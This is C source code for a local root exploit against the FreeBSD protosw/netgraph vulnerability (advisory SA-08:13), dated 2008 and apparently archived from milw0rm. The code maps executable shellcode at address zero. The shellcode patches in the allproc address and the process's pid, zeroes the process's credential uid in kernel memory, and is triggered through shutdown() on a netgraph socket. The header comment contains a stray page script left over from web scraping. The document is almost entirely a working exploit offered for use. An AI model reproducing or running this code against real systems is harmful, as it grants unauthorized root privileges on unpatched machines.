/*
 * This is a quick and very dirty exploit for the FreeBSD protosw vulnerability
 * defined here: 
 * http://security.freebsd.org/advisories/FreeBSD-SA-08:13.protosw.asc
 *
 * This will overwrite your credential structure in the kernel. This will 
 * affect more than just the exploit's process, which is why this doesn't
 * spawn a shell. When the exploit has finished, your login shell should
 * have euid=0. 
 *
 * Enjoy, and happy holidays!
 *  - Don "north" Bailey (don.bailey@gmail.com<SCRIPT type=text/javascript>
/* <![CDATA[ */
(function(){try{var s,a,i,j,r,c,l=document.getElementById("__cf_email__");a=l.className;if(a){s='';r=parseInt(a.substr(0,2),16);for(j=2;a.length-j;j+=2){c=parseInt(a.substr(j,2),16)^r;s+=String.fromCharCode(c);}s=document.createTextNode(s);l.parentNode.replaceChild(s,l);}}catch(e){}})();
/* ]]> */
</SCRIPT>) 12/25/2008
 */

#include <sys/mman.h>
#include <sys/time.h>
#include <sys/stat.h>
#include <sys/proc.h>
#include <sys/types.h>
#include <sys/param.h>
#include <sys/socket.h>
#include <netgraph/ng_socket.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <errno.h>

#define PAGES 1
#define PATTERN1 0x8f8f8f8f
#define PATTERN2 0x6e6e6e6e

typedef unsigned long ulong;
typedef unsigned char uchar;

int
x(void)
{
	struct proc * p = (struct proc * )PATTERN1;
	uint * i;

	while(1)
	{
		if(p->p_pid == PATTERN2)
		{
			i = (uint * )p->p_ucred;
			*++i = 0;
			break;
		}

		p = p->p_list.le_next;
	}

	return 1;
}

int
main(int argc, char * argv[])
{
	ulong addr;
	uchar * c;
	uchar * d;
	uint * i;
	void * v;
	int pid;
	int s;

	if(argc != 2)
	{
		fprintf(stderr, "usage: ./x <allproc>\n");
		return 1;
	}

	addr = strtoul(argv[1], 0, 0);

	v = mmap(
		NULL,
		(PAGES*PAGE_SIZE),
		PROT_READ|PROT_WRITE|PROT_EXEC, 
		MAP_ANON|MAP_FIXED, 
		-1, 
		0);
	if(v == MAP_FAILED)
	{
		perror("mmap");
		return 0;
	}

	c = v;
	d = (uchar * )x;
	while(1)
	{
		*c = *d;
		if(*d == 0xc3)
		{
			break;
		}

		d++;
		c++;
	}

	*c++ = 0xc3;

	c = v;
	while(1)
	{
		if(*(long * )c == PATTERN1)
		{
			*(c + 0) = addr >>  0;
			*(c + 1) = addr >>  8;
			*(c + 2) = addr >> 16;
			*(c + 3) = addr >> 24;
			break;
		}
		c++;
	}

	pid = getpid();
	while(1)
	{
		if(*(long * )c == PATTERN2)
		{
			*(c + 0) = pid >>  0;
			*(c + 1) = pid >>  8;
			*(c + 2) = pid >> 16;
			*(c + 3) = pid >> 24;
			break;
		}
		c++;
	}

	s = socket(PF_NETGRAPH, SOCK_DGRAM, NG_DATA);
	if(s < 0)
	{
		perror("socket");
		return 1;
	}

	shutdown(s, SHUT_RDWR);

	return 0;
}

// milw0rm.com [2008-12-28]
